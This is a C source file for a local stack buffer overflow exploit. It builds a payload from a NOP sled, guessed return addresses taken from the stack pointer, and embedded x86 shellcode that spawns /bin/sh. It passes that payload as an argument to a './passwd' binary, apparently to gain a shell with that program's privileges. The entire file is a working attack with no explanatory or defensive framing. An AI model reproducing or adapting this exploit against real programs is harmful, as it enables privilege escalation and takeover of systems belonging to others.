#include <stdio.h>
#include <stdlib.h>
#define ALIGN 	0
#define OFFSET	0
#define RET_POSITION	512
#define RANGE	20
#define NOP	0x90

char shellcode[] = 
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void)
{
	__asm__("movl %esp,%eax");
}

main(int argc, char **argv)
{
	char buff[RET_POSITION+RANGE+ALIGN+1], *ptr;
	long addr;
	unsigned long sp;
	int offset=OFFSET, bsize=RET_POSITION+RANGE+ALIGN+1;
	int i;

	if (argc > 1) offset = atoi(argv[1]);
	sp = get_sp();

	addr = sp-offset;
	for (i = 0; i < bsize; i += 4) {
	    buff[i+ALIGN+0] = (addr & 0x000000ff);
	    buff[i+ALIGN+1] = (addr & 0x0000ff00) >> 8;
	    buff[i+ALIGN+2] = (addr & 0x00ff0000) >> 16;
	    buff[i+ALIGN+3] = (addr & 0xff000000) >> 24;
	}

	for (i = 0; i < bsize-RANGE*2-strlen(shellcode)-1; i++) {
	   buff[i] = NOP;
	}

	ptr = buff + bsize - RANGE*2 - strlen(shellcode) - 1;
	
	for (i = 0; i < strlen(shellcode); i++) 
	    *(ptr++) = shellcode[i];

	buff[bsize-1] = '\0';

	execl("./passwd", "passwd", buff, 0);
	printf("Fail in jumping to 0x%08x\n", addr);
}
